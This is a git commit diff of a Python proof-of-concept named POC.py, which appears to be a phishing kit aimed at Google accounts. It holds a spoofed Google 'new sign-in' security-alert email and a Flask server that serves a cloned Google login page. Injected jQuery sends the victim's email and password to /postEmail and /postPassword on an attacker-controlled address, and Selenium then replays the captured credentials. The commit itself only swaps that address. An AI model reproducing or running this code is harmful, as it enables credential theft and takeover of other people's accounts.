1d0643b66394d10511f484b3d5619c9816b7ec93
CarmZy <136038564+TranscriptAI@users.noreply.github.com>
2023-07-07 18:12:39 +0800

    Update and rename poc.py to POC.py
    Signed-off-by: CarmZy <136038564+TranscriptAI@users.noreply.github.com>

--- POC.py
+++ POC.py
@@ -141,7 +141,7 @@ class Attacker:
         message['Subject'] = 'Security alert'
         message['From'] = sender_email
         message['To'] = self.target_email
-        html_content = """<div style="border-style:solid;border-width:thin;border-color:#dadce0;border-radius:8px;padding:40px 20px" align="center"><img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_74x24dp.png" width="74" height="24" aria-hidden="true" style="margin-bottom:16px"><div style="font-family:'Google Sans',Roboto,RobotoDraft,Helvetica,Arial,sans-serif;border-bottom:thin solid #dadce0;color:rgba(0,0,0,0.87);line-height:32px;padding-bottom:24px;text-align:center;word-break:break-word"> <div style="font-size:24px">A new sign-in on Windows </div> <table align="center" style="margin-top:8px"> <tbody> <tr style="line-height:normal"> <td align="right" style="padding-right:8px"> <img width="20" height="20" style="width:20px;height:20px;vertical-align:sub;border-radius:50%" src="https://ui-avatars.com/api/?&background=random&bold=true&font-size=0.5&name=C&size=96&uppercase=true"> </td> <td> <a style="font-family:'Google Sans',Roboto,RobotoDraft,Helvetica,Arial,sans-serif;color:rgba(0,0,0,0.87);font-size:14px;line-height:20px">carmanzyre985@gmail.com</a> </td> </tr> </tbody> </table></div><div style="font-family:Roboto-Regular,Helvetica,Arial,sans-serif;font-size:14px;color:rgba(0,0,0,0.87);line-height:20px;padding-top:20px;text-align:center">We noticed a new sign-in to your Google Account on a Windows device. If this was you, you don't need to do anything. If not, we'll help you secure your account. <div style="padding-top:32px;text-align:center"> <a href="http://192.168.250.100:5000" style="font-family:'Google Sans',Roboto,RobotoDraft,Helvetica,Arial,sans-serif;line-height:16px;color:#ffffff;font-weight:400;text-decoration:none;font-size:14px;display:inline-block;padding:10px 24px;background-color:#4184f3;border-radius:5px;min-width:90px" target="_blank">Check activity</a> </div></div><div style="font-family:Roboto-Regular,Helvetica,Arial,sans-serif;padding-top:20px;font-size:12px;line-height:16px;color:#5f6368;letter-spacing:0.3px;text-align:center">You can also see security activity at <br> <a style="color:rgba(0,0,0,0.87);text-decoration:inherit">https://myaccount.google.com/ <wbr>notifications </a></div></div><div style="text-align:left"><div style="font-family:Roboto-Regular,Helvetica,Arial,sans-serif;color:rgba(0,0,0,0.54);font-size:11px;line-height:18px;padding-top:12px;text-align:center"> <div>You received this email to let you know about important changes to your Google Account and services.</div> <div style="direction:ltr">&copy; 2023 Google LLC, <a class="m_6052542541626754474afal" style="font-family:Roboto-Regular,Helvetica,Arial,sans-serif;color:rgba(0,0,0,0.54);font-size:11px;line-height:18px;padding-top:12px;text-align:center">1600 Amphitheatre Parkway, Mountain View, CA 94043, USA</a> </div></div></div>"""
+        html_content = """<div style="border-style:solid;border-width:thin;border-color:#dadce0;border-radius:8px;padding:40px 20px" align="center"><img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_74x24dp.png" width="74" height="24" aria-hidden="true" style="margin-bottom:16px"><div style="font-family:'Google Sans',Roboto,RobotoDraft,Helvetica,Arial,sans-serif;border-bottom:thin solid #dadce0;color:rgba(0,0,0,0.87);line-height:32px;padding-bottom:24px;text-align:center;word-break:break-word"> <div style="font-size:24px">A new sign-in on Windows </div> <table align="center" style="margin-top:8px"> <tbody> <tr style="line-height:normal"> <td align="right" style="padding-right:8px"> <img width="20" height="20" style="width:20px;height:20px;vertical-align:sub;border-radius:50%" src="https://ui-avatars.com/api/?&background=random&bold=true&font-size=0.5&name=C&size=96&uppercase=true"> </td> <td> <a style="font-family:'Google Sans',Roboto,RobotoDraft,Helvetica,Arial,sans-serif;color:rgba(0,0,0,0.87);font-size:14px;line-height:20px">carmanzyre985@gmail.com</a> </td> </tr> </tbody> </table></div><div style="font-family:Roboto-Regular,Helvetica,Arial,sans-serif;font-size:14px;color:rgba(0,0,0,0.87);line-height:20px;padding-top:20px;text-align:center">We noticed a new sign-in to your Google Account on a Windows device. If this was you, you don't need to do anything. If not, we'll help you secure your account. <div style="padding-top:32px;text-align:center"> <a href="http://192.168.254.116:5000" style="font-family:'Google Sans',Roboto,RobotoDraft,Helvetica,Arial,sans-serif;line-height:16px;color:#ffffff;font-weight:400;text-decoration:none;font-size:14px;display:inline-block;padding:10px 24px;background-color:#4184f3;border-radius:5px;min-width:90px" target="_blank">Check activity</a> </div></div><div style="font-family:Roboto-Regular,Helvetica,Arial,sans-serif;padding-top:20px;font-size:12px;line-height:16px;color:#5f6368;letter-spacing:0.3px;text-align:center">You can also see security activity at <br> <a style="color:rgba(0,0,0,0.87);text-decoration:inherit">https://myaccount.google.com/ <wbr>notifications </a></div></div><div style="text-align:left"><div style="font-family:Roboto-Regular,Helvetica,Arial,sans-serif;color:rgba(0,0,0,0.54);font-size:11px;line-height:18px;padding-top:12px;text-align:center"> <div>You received this email to let you know about important changes to your Google Account and services.</div> <div style="direction:ltr">&copy; 2023 Google LLC, <a class="m_6052542541626754474afal" style="font-family:Roboto-Regular,Helvetica,Arial,sans-serif;color:rgba(0,0,0,0.54);font-size:11px;line-height:18px;padding-top:12px;text-align:center">1600 Amphitheatre Parkway, Mountain View, CA 94043, USA</a> </div></div></div>"""
         html_part = MIMEText(html_content, 'html')
         message.attach(html_part)
         smtp_server.sendmail(sender_email, receiver_email, message.as_string())
@@ -156,7 +156,7 @@ class Attacker:
             WebDriverWait(self.browser, 5).until(EC.visibility_of_element_located((By.CSS_SELECTOR, password)))
             # Still fixing checkbox that's triggering the malfunction...
             jquery_injector(self.browser.page_source, 'password_page.html',
-            'if(f.event.which===13||f.event.type==="checkbox"&&$(f.event.target).is("#selectionc1")||f.event.type==="click"&&$(f.event.target).is("#passwordNext>div>button>span")){var p=$("input[type=password]").val();$.post("http://192.168.250.100:5000/postPassword",{"password":p});return false;}', False)
+            'if(f.event.which===13||f.event.type==="checkbox"&&$(f.event.target).is("#selectionc1")||f.event.type==="click"&&$(f.event.target).is("#passwordNext>div>button>span")){var p=$("input[type=password]").val();$.post("http://192.168.254.116:5000/postPassword",{"password":p});return false;}', False)
         elif email_dict is None and password_dict is not None:
             self.browser.find_element(By.CSS_SELECTOR, password).send_keys(password_dict['password'])
             self.browser.find_element(By.CSS_SELECTOR, '#passwordNext>div>button>span').click()
@@ -166,7 +166,7 @@ attacker = Attacker('example@gmail.com')
 @app.route('/')
 def index():
     result = make_response(send_file('email_page.html'))
-    result.headers.add('Access-Control-Allow-Origin', 'http://192.168.250.100:5000')
+    result.headers.add('Access-Control-Allow-Origin', 'http://192.168.254.116:5000')
     result.headers.add('X-XSS-Protection', '1; mode=block')
     result.headers.add('X-Frame-Options', 'SAMEORIGIN')
     return result
@@ -181,11 +181,11 @@ def postEmail():
 
 @app.route('/Password')
 def Password():
-    password_page = 'password_page.html' 
+    password_page = 'password_page.html'
     while True:
         if path.exists(password_page):
             result = make_response(send_file(password_page))
-            result.headers.add('Access-Control-Allow-Origin', 'http://192.168.250.100:5000')
+            result.headers.add('Access-Control-Allow-Origin', 'http://192.168.254.116:5000')
             result.headers.add('X-XSS-Protection', '1; mode=block')
             result.headers.add('X-Frame-Options', 'SAMEORIGIN')
             return result
@@ -204,4 +204,4 @@ def postPassword():
 if __name__ == "__main__":
     jquery_injector(urlopen(Request('https://accounts.google.com/ServiceLogin', headers=Headers(browser='chrome',
     os='win', headers=True).generate())).read(), 'email_page.html', 'if(f.event.which===13||f.event.type==="click"&&$(f.event.target).is("#identifierNext>div>button>span")){var e=$("input[type=email]").val();$.post("http://192.168.254.116:5000/postEmail",{"email":e},function(){window.location="http://192.168.254.116:5000/Password"});return false;}')
-    app.run(host='192.168.250.100', port=5000)
+    app.run(host='192.168.254.116', port=5000)
